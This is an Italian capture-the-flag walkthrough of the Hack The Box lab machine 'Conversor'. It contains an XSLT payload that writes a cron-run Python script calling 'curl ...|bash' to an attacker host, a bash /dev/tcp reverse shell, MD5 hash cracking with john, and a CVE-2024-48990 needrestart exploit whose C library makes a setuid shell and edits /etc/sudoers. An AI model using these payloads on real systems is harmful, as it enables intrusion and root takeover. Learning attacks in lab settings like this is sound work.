Macchina Conversor

IP vittima: 10.10.11.92 IP attacante: 10.10.14.27

## Recon

`sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.92 -oG porte `

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-31 18:13 CET
Nmap scan report for 10.10.11.92
Host is up (0.068s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 11.53 seconds
```

`sudo nmap -sC -sV -O 10.10.11.92 -oN servizi`

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-31 18:14 CET
Nmap scan report for conversor.htb (10.10.11.92)
Host is up (0.022s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-title: Login
|_Requested resource was /login
|_http-server-header: Apache/2.4.52 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=10/31%OT=22%CT=1%CU=39026%PV=Y%DS=2%DC=I%G=Y%TM=690
OS:4EE83%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A
OS:)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552
OS:ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1
OS:=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O
OS:=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N
OS:)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1
OS:(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.61 seconds
```

## Porta 80

Probabilmente non si riesce a visitare la porta http 80 sul browser quindi aggiornare `/etc/hosts con: <IP MACCHINA> conversor.htb`

Visitiamo il sito sulla porta 80
![[https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted image 20251031181717.png]]
Creiamo un account e accediamo:
![[https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted image 20251031181908.png]]
Scarichiamo il template (download Template->nmap.xslt), poi accediamo alla pagina `about` e scarichiamo il Source Code (Download Source Code->source_code.tar.gz).
Apriamo il file zippato source_code.tar.gz ed esaminiamolo:

```
├── app.py
├── app.wsgi
├── install.md
├── instance
│   └── users.db
├── nmap.xslt
├── scripts
├── source_code.tar.gz
├── static
│   ├── images
│   │   ├── arturo.png
│   │   ├── david.png
│   │   └── fismathack.png
│   ├── nmap.xslt
│   └── style.css
├── templates
│   ├── about.html
│   ├── base.html
│   ├── index.html
│   ├── login.html
│   ├── register.html
│   └── result.html
└── uploads
```

E' presente un file `users.db` che risulta essere vuoto
Invece il file `install.md` fa capire che se troviamo un modo per caricare uno script e metterlo nella cartella /var/www/conversor.htb/scripts/, questo script verrà eseguito facendoci ottenere una shell:

```
If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

### Reverse shell

Il sito consente di ottenere una rappresentazione gradevole di una ricerca nmap caricando un file xml con lo scan effettuato e un template xslt (il file nmap.xslt che abbiamo scaricato prima). E' possibile quindi modificare il template per creare uno script che messo nella cartella /var/www/conversor.htb/scripts/ non farà altro che uploadare una reverse shell dal nostro pc:

Il file xslt modificato è il seguente `shell.xslt:

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell"
    version="1.0"
>
<xsl:template match="/">
<shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl 10.10.14.27:8000/shell.sh|bash")
</shell:document>
</xsl:template>
</xsl:stylesheet>
```

La parte fondamentale è questa:

```
<shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl 10.10.14.15:8000/shell.sh|bash")
```

Crea uno script python shell.py nella cartella /var/www/conversor.htb/scripts/ che non fa altro che eseguire un curl alla nostra macchina per caricare la shell `shell.sh` ed eseguirla con `bash`

Prepariamo il file `shell.sh`:

```
#!/bin/bash 
bash -i >& /dev/tcp/10.10.14.27/9001 0>&1
```

Questa non è altro che una semplice reverse shell.
 Creiamo un file xml con uno scan nmap ( `sudo nmap -sC -sV 10.10.11.92 -oX nmap.xml` )
 Avviamo un server python nella cartella che contiene il file appena `shell.sh`
 `python3 -m http.server 8000`
 In un'altra finestra mettiamoci in ascolto con `nc -lvnp 9001`
Sul sito carichiamo il file xml con lo scan nmap (nmap.xml) e il file shell.xslt e clicchiamo su "Convert". Il sito crea un file nella sezione "Your Uploaded Files". Clicchiamo sul file creato.
Lo script `shell.xslt` crea lo script python che viene eseguito lanciando il comando curl che fa l'upload della nostra macchina della reverse shell (sheel.sh) e la lancia con bash, inviando la shell sulla nostra porta 9001 in ascolto. Siamo dentro la macchina.

### Shell utente

Una volta entrati siamo nella cartella `/var/www` che contiene la cartella `conversor.htb`. Entriamo in questa cartella. Qui troviamo la stessa struttura contenuta nel file zippato quindi nella cartella `instance` è presente il file `users.db`, esaminiamolo:

```
www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db
sqlite3 users.db
.tables
files  users
SELECT * FROM users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|admin|bb14a216bb6ff6410151e139d5470271
6|123|202cb962ac59075b964b07152d234b70
7|xerand|af643215fb40317aa23d66c3dd4bfaeb
```

Poi esaminiamo il file `/etc/passwd` (cat /etc/passwd)
Troviamo l'utente `fismathack`:
`fismathack:x:1000:1000:fismathack:/home/fismathack:/bin/bash`
Quindi `5b5c3ac3a1c897c94caad48e6c71fdec` potrebbe essere la password in MD5 dell'utente ``fismathack`

Possiamo provare a craccarla con [[johntheripper]]
salviamo `5b5c3ac3a1c897c94caad48e6c71fdec` nel file hash.txt e lanciamo il comando
`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-md5`
Troviamo la password `Keepmesafeandwarm`:

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
Keepmesafeandwarm (?)     
1g 0:00:00:00 DONE (2025-10-31 20:27) 2.000g/s 21945Kp/s 21945Kc/s 21945KC/s Keiser01..Keepers137
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

Possiamo accedere al servizio ssh con l'utente `fismathack` e la password `Keepmesafeandwarm` ( `ssh fismathack@10.10.11.92`) 
Siamo nella cartella `/home/fismathack` dove c'è il file `user.txt` che contiene la userflag

### Scalata dei privilegi

Con `sudo -l` troviamo:

```
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

Il file `/usr/sbin/needrestart` può essere eseguito dall'utente `fismathack` con privilegi root senza password.
Con `needrestart --version` vediamo che la versione è la 3.7 che è soggetta all'exploit `# CVE-2024-48990`:

1. https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing
2. https://github.com/makuga01/CVE-2024-48990-PoC/
  Come vediamo dal file dell'exploit `runner.sh` che troviamo nella prima repository, è necessaria la presenza sulla macchina vittima di un compilatore c (gcc) che però non è presente sulla macchina. Dobbiamo quindi compilare sulla nostra macchina il file `lib.c` che troviamo nella seconda repository:
  
  ```
  #include <stdio.h>
  #include <stdlib.h>
  #include <sys/types.h>
  #include <unistd.h>
  ```
  

static void a() __attribute__((constructor));

void a() {
 if(geteuid() == 0) { // Only execute if we're running with root privileges
 setuid(0);
 setgid(0);
 const char *shell = "cp /bin/sh /tmp/poc; "
 "chmod u+s /tmp/poc; "
 "grep -qxF 'ALL ALL=NOPASSWD: /tmp/poc' /etc/sudoers || "
 "echo 'ALL ALL=NOPASSWD: /tmp/poc' | tee -a /etc/sudoers > />
 system(shell);
 }
}

````
Compiliamo `lib.c` con il comando:
`x86_64-linux-gnu-gcc -shared -fPIC -o __init__.so lib.c`
per creare il file `__init__.so`

Modifichiamo il file `runner.sh` come segue:
``` bash
#!/bin/bash
set -e
cd /tmp
mkdir -p malicious/importlib

#chage to your ip and open python http server
curl http://10.10.14.27:8000/__init__.so -o /tmp/malicious/importlib/__init__.so

# Minimal Python script to trigger import
cat << 'EOF' > /tmp/malicious/e.py
import time
while True:
    try:
        import importlib
    except:
        pass
    if __import__("os").path.exists("/tmp/poc"):
        print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")
        __import__("os").system("sudo /tmp/poc -p")
        break
    time.sleep(1)
EOF

cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
````

In pratica, si toglie il comando per compilare e lo si sostituisce con il comando curl per caricare dalla nostra macchina il file `__init__.so` creato.

Avviamo un server python nella cartella dove è stato creato il file `__init__.so` (`python3 -m http.server 8000`) 
Sulla macchina vittima andiamo nella cartella `/dev/shm` (La cartella **`/dev/shm`** in Linux è una **memoria condivisa (shared memory)** che risiede **in RAM**, non su disco)
Scarichiamo il file `runner.sh` (`wget http://10.10.14.27:8000/runner.sh`) , diamogli i permessi di esecuzione con `chmod +x runner.sh` e lanciamolo con `./runner.sh`.
Apriamo un nuovo terminale ssh (`ssh fismathack@10.10.11.92`) e lanciamo lo script vulnerabile `needrestart` con `sudo /usr/sbin/needrestart`
Nella primo terminale ssh diveneteremo root.
Nella cartella `/root` troviamo il file `root.txt` con la rootflag.
